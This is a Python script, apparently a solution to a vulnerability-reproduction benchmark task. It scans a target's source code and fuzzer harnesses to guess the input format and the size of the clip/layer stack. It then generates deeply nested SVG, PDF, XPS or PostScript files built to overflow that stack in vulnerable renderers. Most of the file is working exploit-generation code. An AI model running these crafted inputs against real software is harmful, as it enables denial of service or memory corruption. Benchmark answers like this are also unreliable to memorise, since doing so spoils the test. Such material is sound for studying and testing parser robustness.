import os
import re
import io
import tarfile
import zipfile
from typing import Dict, List, Optional, Tuple


SOURCE_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc",
    ".m", ".mm",
    ".rs", ".go", ".java", ".kt", ".swift",
    ".py", ".js", ".ts",
}

KEYWORDS = [
    b"clip mark",
    b"clip_mark",
    b"layer/clip",
    b"layer clip",
    b"layer_clip",
    b"nesting depth",
    b"nesting_depth",
    b"clip stack",
    b"clip_stack",
    b"layer stack",
    b"layer_stack",
]

FUZZER_KEY = b"llvmfuzzertestoneinput"


def _safe_int(x: str) -> Optional[int]:
    try:
        x = x.strip()
        if not x:
            return None
        if x.lower().startswith("0x"):
            v = int(x, 16)
        else:
            v = int(x, 10)
        return v
    except Exception:
        return None


def _iter_source_files_from_tar(src_path: str):
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            _, ext = os.path.splitext(name)
            ext = ext.lower()
            if ext not in SOURCE_EXTS:
                continue
            if m.size <= 0 or m.size > 2_000_000:
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue
            yield name, data


def _iter_source_files_from_dir(src_dir: str):
    for root, _, files in os.walk(src_dir):
        for fn in files:
            _, ext = os.path.splitext(fn)
            ext = ext.lower()
            if ext not in SOURCE_EXTS:
                continue
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            rel = os.path.relpath(path, src_dir)
            yield rel, data


def _iter_source_files(src_path: str):
    if os.path.isdir(src_path):
        yield from _iter_source_files_from_dir(src_path)
        return
    yield from _iter_source_files_from_tar(src_path)


def _collect_relevant_files(src_path: str) -> Tuple[List[Tuple[str, bytes]], List[Tuple[str, bytes]]]:
    fuzzers: List[Tuple[str, bytes]] = []
    relevant: List[Tuple[str, bytes]] = []
    for name, data in _iter_source_files(src_path):
        low = data.lower()
        is_fuzzer = FUZZER_KEY in low
        if is_fuzzer:
            fuzzers.append((name, data))
        if any(k in low for k in KEYWORDS):
            relevant.append((name, data))
        else:
            if is_fuzzer:
                relevant.append((name, data))
    return fuzzers, relevant


def _format_scores(fuzzers: List[Tuple[str, bytes]], relevant: List[Tuple[str, bytes]]) -> Dict[str, int]:
    scores = {"svg": 0, "pdf": 0, "xps": 0, "ps": 0}
    items = []
    items.extend(fuzzers)
    items.extend(relevant)

    def add(fmt: str, v: int):
        scores[fmt] = scores.get(fmt, 0) + v

    for name, data in items:
        nlow = name.lower()
        low = data.lower()

        if "svg" in nlow:
            add("svg", 8)
        if "xps" in nlow:
            add("xps", 8)
        if "pdf" in nlow:
            add("pdf", 8)
        if nlow.endswith(".ps") or "postscript" in nlow:
            add("ps", 4)

        if b"<svg" in low or b"clip-path" in low or b"<clippath" in low:
            add("svg", 10)
        if b"fixedpage" in low and b"xps" in low:
            add("xps", 8)
        if b"fixedpage" in low and b"schemas.microsoft.com/xps" in low:
            add("xps", 12)
        if b"%pdf" in low or b"xref" in low or b"startxref" in low:
            add("pdf", 10)

        if b"rsvg" in low or b"librsvg" in low:
            add("svg", 12)
        if b"fz_open_document" in low or b"mupdf" in low or b"fitz" in low:
            add("pdf", 2)
            add("xps", 2)
            add("svg", 2)

        if b"fpdf_" in low or b"pdfium" in low:
            add("pdf", 14)

        if b"gsave" in low or b"grestore" in low:
            add("ps", 6)

        if (b"clip mark" in low or b"clip_mark" in low) and (b"layer/clip" in low or b"layer_clip" in low):
            add("svg", 1)
            add("pdf", 1)
            add("xps", 1)

    return scores


def _pick_format(scores: Dict[str, int]) -> str:
    best = "svg"
    bestv = -1
    for k, v in scores.items():
        if v > bestv:
            best = k
            bestv = v
    return best


def _infer_stack_size_from_text(text: str) -> Optional[int]:
    # Weights: higher means more likely to be the actual stack bound.
    candidates: List[Tuple[int, int]] = []
    t = text
    tl = text.lower()

    def add(val: int, score: int):
        if val <= 0 or val > 5_000_000:
            return
        candidates.append((score, val))

    # Look for array sizes near stack-related identifiers
    for m in re.finditer(r"\[\s*(0x[0-9a-fA-F]+|\d+)\s*\]", t):
        val = _safe_int(m.group(1))
        if val is None:
            continue
        a = max(0, m.start() - 120)
        b = min(len(t), m.end() + 120)
        ctx = tl[a:b]
        score = 0
        if "clip" in ctx and "stack" in ctx:
            score += 4
        if "layer" in ctx and "stack" in ctx:
            score += 4
        if "layer" in ctx and "clip" in ctx and "stack" in ctx:
            score += 3
        if "nest" in ctx and "depth" in ctx:
            score += 2
        if "mark" in ctx and "clip" in ctx:
            score += 2
        if score > 0:
            add(val, score)

    # Look for defines and constants
    for m in re.finditer(r"(?mi)^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(0x[0-9a-fA-F]+|\d+)\b", t):
        name = m.group(1).lower()
        val = _safe_int(m.group(2))
        if val is None:
            continue
        score = 0
        if "stack" in name:
            score += 3
        if "clip" in name:
            score += 3
        if "layer" in name:
            score += 3
        if "nest" in name or "depth" in name:
            score += 3
        if score >= 4:
            add(val, score)

    # Search for max nesting patterns
    for m in re.finditer(r"(?i)\bmax[_\s-]*nest(?:ing)?[_\s-]*depth\b[^0-9a-fA-F]{0,40}(0x[0-9a-fA-F]+|\d+)", t):
        val = _safe_int(m.group(1))
        if val is None:
            continue
        add(val, 7)

    if not candidates:
        return None
    candidates.sort(key=lambda x: (x[0], x[1]), reverse=True)
    top_score = candidates[0][0]
    top_vals = [v for s, v in candidates if s == top_score]
    # Prefer a value in a common range if multiple.
    for target in (32768, 65536, 16384, 4096, 2048, 1024, 512, 256):
        if target in top_vals:
            return target
    return max(top_vals)


def _infer_stack_size(relevant: List[Tuple[str, bytes]], fuzzers: List[Tuple[str, bytes]]) -> int:
    texts = []
    for _, data in relevant:
        try:
            texts.append(data.decode("latin1", errors="ignore"))
        except Exception:
            pass
    for _, data in fuzzers:
        try:
            texts.append(data.decode("latin1", errors="ignore"))
        except Exception:
            pass

    best: Optional[int] = None
    for t in texts:
        v = _infer_stack_size_from_text(t)
        if v is None:
            continue
        if best is None:
            best = v
        else:
            # Prefer larger likely bounds.
            if v > best:
                best = v

    if best is None:
        return 32768
    if best < 32:
        return 32
    if best > 2_000_000:
        return 32768
    return best


def _gen_svg(depth: int) -> bytes:
    # Repeated clipping groups
    prefix = b'<svg xmlns="http://www.w3.org/2000/svg"><defs><clipPath id="a"><rect width="1" height="1"/></clipPath></defs>'
    open_tag = b'<g clip-path="url(#a)">'
    mid = b'<rect width="1" height="1"/>'
    close_tag = b'</g>'
    suffix = b'</svg>'
    return prefix + (open_tag * depth) + mid + (close_tag * depth) + suffix


def _build_pdf(stream: bytes) -> bytes:
    header = b"%PDF-1.4\n%\xff\xff\xff\xff\n"
    objs: List[bytes] = []

    objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")
    objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
    objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>")
    objs.append(b"<< /Length " + str(len(stream)).encode("ascii") + b" >>\nstream\n" + stream + b"\nendstream")

    out = bytearray()
    out += header
    offsets = [0]

    for i, obj in enumerate(objs, start=1):
        offsets.append(len(out))
        out += str(i).encode("ascii") + b" 0 obj\n"
        out += obj + b"\nendobj\n"

    xref_start = len(out)
    out += b"xref\n0 " + str(len(objs) + 1).encode("ascii") + b"\n"
    out += b"0000000000 65535 f \n"
    for i in range(1, len(objs) + 1):
        out += f"{offsets[i]:010d} 00000 n \n".encode("ascii")

    out += b"trailer\n<< /Size " + str(len(objs) + 1).encode("ascii") + b" /Root 1 0 R >>\n"
    out += b"startxref\n" + str(xref_start).encode("ascii") + b"\n%%EOF\n"
    return bytes(out)


def _gen_pdf(depth: int) -> bytes:
    # Combine save+clip per level to ensure clip-related bookkeeping is exercised.
    # Keep tokens compact while remaining valid.
    # Each level: q 0 0 0 0 re W n
    level = b"q 0 0 0 0 re W n\n"
    stream = (level * depth) + (b"Q\n" * depth)
    return _build_pdf(stream)


def _gen_ps(depth: int) -> bytes:
    # Minimal PostScript with nested gsave and clip. (May or may not be relevant.)
    # Each level: gsave newpath 0 0 moveto 0 0 lineto clip
    header = b"%!PS-Adobe-3.0\n"
    # Simple clipping path creation - degenerate but accepted by many interpreters
    level = b"gsave newpath 0 0 moveto 0 0 lineto clip\n"
    trailer = (b"grestore\n" * depth) + b"showpage\n"
    return header + (level * depth) + trailer


def _gen_xps(depth: int) -> bytes:
    # Minimal XPS ZIP container.
    # Nested Canvas elements with Clip attribute to push clip stack.
    # Keep geometry compact.
    canvas_open = b'<Canvas Clip="M0,0 L1,0 1,1 0,1Z">'
    canvas_close = b"</Canvas>"
    page = bytearray()
    page += b'<FixedPage xmlns="http://schemas.microsoft.com/xps/2005/06" Width="1" Height="1">'
    page += canvas_open * depth
    page += b'<Path Data="M0,0 L1,0 1,1 0,1Z" Fill="#000000"/>'
    page += canvas_close * depth
    page += b"</FixedPage>"

    content_types = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        b'<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        b'<Default Extension="xml" ContentType="application/xml"/>'
        b'<Override PartName="/FixedDocSeq.fdseq" ContentType="application/vnd.ms-package.xps-fixeddocumentsequence+xml"/>'
        b'<Override PartName="/Documents/1/FixedDoc.fdoc" ContentType="application/vnd.ms-package.xps-fixeddocument+xml"/>'
        b'<Override PartName="/Documents/1/Pages/1.fpage" ContentType="application/vnd.ms-package.xps-fixedpage+xml"/>'
        b"</Types>"
    )

    rels = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="http://schemas.microsoft.com/xps/2005/06/fixedrepresentation" Target="/FixedDocSeq.fdseq"/>'
        b"</Relationships>"
    )

    fdseq = (
        b'<FixedDocumentSequence xmlns="http://schemas.microsoft.com/xps/2005/06">'
        b'<DocumentReference Source="Documents/1/FixedDoc.fdoc"/>'
        b"</FixedDocumentSequence>"
    )

    fdoc = (
        b'<FixedDocument xmlns="http://schemas.microsoft.com/xps/2005/06">'
        b'<PageContent Source="Pages/1.fpage"/>'
        b"</FixedDocument>"
    )

    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", compression=zipfile.ZIP_STORED) as z:
        z.writestr("[Content_Types].xml", content_types)
        z.writestr("_rels/.rels", rels)
        z.writestr("FixedDocSeq.fdseq", fdseq)
        z.writestr("Documents/1/FixedDoc.fdoc", fdoc)
        z.writestr("Documents/1/Pages/1.fpage", bytes(page))
    return bio.getvalue()


class Solution:
    def solve(self, src_path: str) -> bytes:
        fuzzers, relevant = _collect_relevant_files(src_path)
        scores = _format_scores(fuzzers, relevant)
        fmt = _pick_format(scores)
        stack = _infer_stack_size(relevant, fuzzers)
        depth = stack + 8

        # Keep output size practical if inferred stack is unexpectedly huge.
        # Still likely to overflow early in vulnerable code.
        if depth > 500_000:
            depth = 500_000

        if fmt == "pdf":
            return _gen_pdf(depth)
        if fmt == "xps":
            return _gen_xps(depth)
        if fmt == "ps":
            return _gen_ps(depth)
        return _gen_svg(depth)